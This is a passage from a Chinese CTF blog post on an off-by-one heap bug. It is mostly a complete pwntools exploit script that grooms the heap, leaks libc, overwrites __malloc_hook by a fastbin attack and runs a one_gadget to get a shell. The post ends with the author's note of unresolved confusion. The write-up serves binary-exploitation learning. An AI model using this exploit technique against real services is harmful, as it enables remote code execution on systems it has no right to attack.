class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">    PORT = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        PATH = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    p = process(PATH)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <span class="comment"># ubuntu 16.04</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">command_num</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command_num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span>(<span class="params">key, size, data</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;PUT&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;key:&#x27;</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;data:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; size:</span><br><span class="line">        p.send(data.ljust(size, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">key</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;DEL&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;key:&#x27;</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">key</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;key:&#x27;</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; bytes&#x27;</span>).strip(<span class="string">&#x27; bytes&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recv(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># avoid complicity of structure malloc</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        put(<span class="built_in">str</span>(i), <span class="number">0x38</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        delete(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># allocate what we want in order</span></span><br><span class="line">    put(<span class="string">&#x27;1&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;2&#x27;</span>, <span class="number">0x50</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;5&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;3&#x27;</span>, <span class="number">0x1f8</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;4&#x27;</span>, <span class="number">0xf0</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;defense&#x27;</span>, <span class="number">0x400</span>, <span class="string">&#x27;defense-data&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free those need to be freed</span></span><br><span class="line">    delete(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x1f0</span> + p64(<span class="number">0x4e0</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    put(<span class="string">&#x27;0x200&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;fillup&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;0x200 fillup&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;fillup again&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc_leak = u64(get(<span class="string">&#x27;2&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    p.info(<span class="string">&#x27;libc leak: 0x%x&#x27;</span> % libc_leak)</span><br><span class="line"></span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">    p.info(<span class="string">&#x27;libc_base: 0x%x&#x27;</span> % libc_base)</span><br><span class="line"></span><br><span class="line">    put(<span class="string">&#x27;fastatk&#x27;</span>, <span class="number">0x100</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x58</span> + p64(<span class="number">0x71</span>) + p64(libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> + <span class="number">5</span> - <span class="number">8</span>))</span><br><span class="line">    put(<span class="string">&#x27;prepare&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;prepare data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">    put(<span class="string">&#x27;attack&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">3</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;DEL&#x27;</span>) <span class="comment"># malloc(8) triggers one_gadget</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>​        ps.不过有一个地方一直没弄明白：前面说的每一次PUT都会mallc()3次，而且理应是连续地址的三个chunk，但是CTF-Wiki的解法，以及各种其他师傅的解法都只考虑了data chunk，我和刘老板倒是考虑了三个chunk连续的情况，但是我没整出来。暂时先按照writeup的来吧。。之后再回头看看。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/03/16/Off_By_One/" data-id="ckmlis0z30007s0lj67cq46rm" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/04/09/Vtable-Hijack(the_end)/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Vtable-Hijack(the_end)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/03/06/house-of-spirit/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">House_of_spirit</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Bin Fantasy🤯</h1>
+    <h2 class="blog-subtitle">You may found nothing here.</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友链</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2020 - 2021 Ash3n On3<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
